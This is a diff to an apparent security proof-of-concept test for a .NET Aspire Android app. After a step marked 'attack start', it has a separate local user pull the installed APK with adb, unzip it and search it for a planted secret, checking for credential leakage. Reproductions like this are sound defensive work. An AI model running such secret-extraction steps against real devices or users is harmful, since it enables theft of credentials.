@@ -42,6 +42,7 @@ using System.Security.Cryptography;
 var secret = Convert.ToHexString(RandomNumberGenerator.GetBytes(24));
 var expectedHash = Convert.ToHexString(SHA256.HashData(System.Text.Encoding.UTF8.GetBytes(secret))).ToLowerInvariant();
 File.WriteAllText(Environment.GetEnvironmentVariable("F042_EXPECTED_HASH_FILE")!, expectedHash);
+File.WriteAllText(Environment.GetEnvironmentVariable("F042_EXPECTED_VALUE_FILE")!, secret);
 File.WriteAllLines(Environment.GetEnvironmentVariable("F042_HOST_CREDENTIAL_FILE")!, new[]
 {
     Environment.GetEnvironmentVariable("DEBUG_SESSION_PORT") ?? "",
@@ -127,9 +128,10 @@ export DOTNET_ENVIRONMENT=Development
 export ASPIRE_ALLOW_UNSECURED_TRANSPORT=true
 export F042_MOBILE_PROJECT="$mobile/F042Mobile.csproj"
 export F042_EXPECTED_HASH_FILE="$root/expected-hash"
+export F042_EXPECTED_VALUE_FILE="$root/expected-value"
 export F042_HOST_CREDENTIAL_FILE="$root/host-credentials"
-touch "$F042_EXPECTED_HASH_FILE" "$F042_HOST_CREDENTIAL_FILE"
-chmod 600 "$F042_EXPECTED_HASH_FILE" "$F042_HOST_CREDENTIAL_FILE"
+touch "$F042_EXPECTED_HASH_FILE" "$F042_EXPECTED_VALUE_FILE" "$F042_HOST_CREDENTIAL_FILE"
+chmod 600 "$F042_EXPECTED_HASH_FILE" "$F042_EXPECTED_VALUE_FILE" "$F042_HOST_CREDENTIAL_FILE"
 watch_log="$root/watch.log"
 
 cleanup_watch() {
@@ -174,6 +176,7 @@ export ASPIRE_DASHBOARD_OTLP_ENDPOINT_URL=http://127.0.0.1:19173
 export ASPIRE_RESOURCE_SERVICE_ENDPOINT_URL=http://127.0.0.1:20092
 echo F042_ATTACK_START
 : > "$F042_EXPECTED_HASH_FILE"
+: > "$F042_EXPECTED_VALUE_FILE"
 : > "$F042_HOST_CREDENTIAL_FILE"
 cat > "$peer/query.py" <<'EOF'
 import glob, os, subprocess, sys, time
@@ -221,6 +224,18 @@ if [[ -s "$F042_EXPECTED_HASH_FILE" ]]; then
     expected="$(cat "$F042_EXPECTED_HASH_FILE")"
     received="$(sed -n 's/^F042_RECEIVED_HASH=//p' "$root/peer.log" | tail -1)"
     echo "F042_HASH_MATCH=$([[ "$expected" == "$received" ]] && echo True || echo False)"
+fi
+echo "F042_ADB_BASELINE_PACKAGE=$(adb shell pm path com.example.f042mobile | head -1)"
+if sudo -u f042_peer test -r "$F042_EXPECTED_VALUE_FILE"; then echo F042_DIRECT_SECRET_VALUE=READABLE; else echo F042_DIRECT_SECRET_VALUE=DENIED; fi
+apk_path="$(sudo -H -u f042_peer adb shell pm path com.example.f042mobile | head -1 | sed -n 's/^package://p')"
+if [[ -n "$apk_path" ]]; then
+    echo F042_PEER_APK_PATH="$apk_path"
+    sudo -H -u f042_peer adb pull "$apk_path" /home/f042_peer/f042mobile.apk
+    sudo -H -u f042_peer mkdir -p /home/f042_peer/f042mobile-extracted
+    sudo -H -u f042_peer unzip -qq /home/f042_peer/f042mobile.apk -d /home/f042_peer/f042mobile-extracted
+    if grep -R -a -F -q "$(cat "$F042_EXPECTED_VALUE_FILE")" /home/f042_peer/f042mobile-extracted; then echo F042_PEER_APK_CONTAINS_SECRET=True; else echo F042_PEER_APK_CONTAINS_SECRET=False; fi
+else
+    echo F042_PEER_APK_PATH=MISSING
 fi
 if grep -q 'Generated environment targets file for Android:' "$watch_log"; then
     path="$(sed -n 's/.*Generated environment targets file for Android: //p' "$watch_log" | tail -1)"
